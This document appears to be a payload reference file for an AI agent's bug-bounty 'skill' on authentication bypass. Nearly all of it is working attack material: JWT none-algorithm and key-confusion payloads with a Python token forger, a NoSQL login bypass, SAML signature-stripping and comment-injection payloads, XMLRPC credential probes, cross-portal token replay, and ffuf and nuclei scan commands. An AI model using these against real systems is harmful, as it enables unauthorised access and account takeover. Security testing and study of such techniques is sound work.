# Payloads — Authentication Bypass

Payload lists and probe banks. Methodology and usage are in the parent SKILL.md.

## Payload references from upstream skills (deduplicated)

### hunting / references/payloads.md

# Auth Bypass — Combined Field Guide — Payload reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.

---

## Payloads & probes



- JWT -> `{"alg":"none"}`, HS256 with public key as secret, `kid=../../dev/null`

- NoSQL -> `{"user":"admin","pass":{"$ne":null}}`

- Type juggling -> `password[]=x`, `otp=0e12345`, `true` vs `"true"`

- Header tricks -> `X-Forwarded-Host: evil`, `Host: evil`, `X-Original-URL: /admin`



## Payload fragments observed



Recurring payloads from this class's writeups. Adapt, don't paste blindly.



| Seen | Fragment |

|---:|---|

| 5× | `artifactory@r3.com` |

| 5× | `<userId>` |

| 4× | `url_match_auth_nego()` |

| 4× | `url_match_result()` |

| 4× | `ssh_config_matches()` |

| 3× | `abc@xyz.com` |

| 3× | `url_match_auth_ntlm()` |

| 3× | `support+1@trint.com` |

| 3× | `k->headerline` |

| 3× | `on_resp_header()` |

| 3× | `namevalue()` |

| 2× | `https://snappublisher.snapchat.com/sso_continue?ticket=<stolen token>` |

| 2× | `https://hackerone.com/apps/atlassian/claim-app?jwt=<TOKEN>` |

| 2× | `{"error": true, "errorMessage": "Invalid request"}` |

| 2× | `postPrivate()` |

| 2× | `badca7@wearehackerone.com` |

| 2× | `https://livechat.shopify.com/customer/chats/new?auth_code=<access_token>&auth_type=chat` |

| 2× | `${window.location.protocol}//${window.location.hostname}/wp-json/newspack-extended-access/v1/google/register` |

| 2× | `GET → 404 {"status":404,"error":"Not Found"}` |

| 2× | `https://github.com/login?client_id=5f45cc999f7812d0b6d2&return_to=%2Flogin%2Foauth%2Fauthorize%3Fclient_id%3D5f45cc999f7812d0b6d2%26redirect` |



## Parameters observed



`client_id` · `redirect_uri` · `state` · `code` · `email` · `response_type` · `error` · `consumer_key` · `host` · `scope` · `id` · `auth_type` · `referrer` · `password` · `client_secret` · `type` · `return_to` · `auth_code` · `page` · `ws`



## Wordlists



Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.



| File | Entries |

|---|---:|

| `~/.local/share/hackerone-reports/wordlists/paths_auth-bypass.txt` | 150 |

| `~/.local/share/hackerone-reports/wordlists/params_auth-bypass.txt` | 150 |

| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |

| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |



```sh

W=~/.local/share/hackerone-reports/wordlists

ffuf -u https://target/FUZZ -w $W/paths_auth-bypass.txt \

     -mc all -fc 404 -fs 0 -rate 40

ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_auth-bypass.txt \

     -mr 'canary|error|invalid|not found' -rate 40

```



## Nuclei



Default-login templates are high signal on admin panels; also test JWT and reset flows manually.



```sh

nuclei -u https://target -tags auth-bypass,default-login,jwt,login \

       -severity low,medium,high,critical -rl 40 -o nuclei_auth-bypass.txt

nuclei -u https://target -t ~/nuclei-templates/http/default-logins \

       -rl 40 -o nuclei_auth-bypass_default-logins.txt

nuclei -u https://target -t ~/nuclei-templates/http/misconfiguration \

       -rl 40 -o nuclei_auth-bypass_misconfiguration.txt

# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'

```



Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.



## Payload & Detection Patterns



**XMLRPC auth probe (bypasses SSO):**

```bash

curl -s -X POST https://target.com/xmlrpc.php \

  -H "Content-Type: text/xml" \

  -d '<?xml version="1.0"?>

<methodCall>

  <methodName>system.listMethods</methodName>

  <params></params>

</methodCall>'



# If 200 with method list → XMLRPC is enabled, test auth:

curl -s -X POST https://target.com/xmlrpc.php \

  -H "Content-Type: text/xml" \

  -d '<?xml version="1.0"?>

<methodCall>

  <methodName>wp.getUsersBlogs</methodName>

  <params>

    <param><value><string>admin</string></value></param>

    <param><value><string>password</string></value></param>

  </params>

</methodCall>'

```



**SAML signature stripping (send unsigned assertion):**

```python

import base64, re



# Decode captured SAMLResponse

saml_b64 = "BASE64_FROM_BURP"

saml_xml = base64.b64decode(saml_b64).decode()



# Strip the Signature element entirely

stripped = re.sub(r'<ds:Signature.*?</ds:Signature>', '', saml_xml, flags=re.DOTALL)



# Re-encode and submit

print(base64.b64encode(stripped.encode()).decode())

```



**SAML XML comment injection (username confusion):**

```xml

<!-- Original NameID -->

<NameID>attacker@evil.com</NameID>



<!-- Injected to confuse parser -->

<NameID>attacker@evil.com<!---->.victim@company.com</NameID>



<!-- Or namespace confusion -->

<NameID xmlns:evil="http://evil.com">victim@company.com</NameID>

```



**Partner/cross-portal token reuse test:**

```bash

# Get token from partner portal

TOKEN=$(curl -s -X POST https://partners.target.com/login \

  -d 'email=attacker@test.com&password=pass' \

  -c cookies.txt | grep -o 'token=[^;]*')



# Replay against admin portal

curl -s https://admin.target.com/dashboard \

  -H "Authorization: Bearer $TOKEN" \

  -H "Cookie: $TOKEN"

```



**JWT none algorithm attack:**

```python

import base64, json



header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip('=')

payload = base64.b64encode(json.dumps({"user_id":1,"role":"admin","email":"victim@company.com"}).encode()).decode().rstrip('=')

token = f"{header}.{payload}."

print(token)

```



**Grep patterns for auth bypass surface:**

```bash

# Find XMLRPC in scope

grep -r "xmlrpc" scope_urls.txt



# Find SSO indicators in JS

grep -rE "(SAMLResponse|samlRequest|RelayState|onelogin|shibboleth)" *.js



# Find partner/admin subdomains

subfinder -d target.com | grep -E "(admin|partner|internal|sso|auth|login)"

```



---
